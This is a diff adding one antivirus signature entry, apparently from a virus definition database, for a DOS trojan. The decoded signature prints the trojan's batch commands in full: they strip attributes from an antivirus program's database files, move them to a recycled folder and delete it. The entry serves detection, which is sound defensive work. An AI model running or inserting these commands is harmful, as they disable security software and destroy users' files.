@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36477
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off ::another dvl creation @attrib c:\progra~1\common~1\avpsha~1\avpbases\*.* -s -h -r +a @md c:\recycled\ >nul @move c:\progra~1\common~1\avpsha~1\avpbases\*.* c:\recycled\ >nul @deltree/y c:\recycled\ >nul ::dvl2003ro@yahoo.co.uk cls
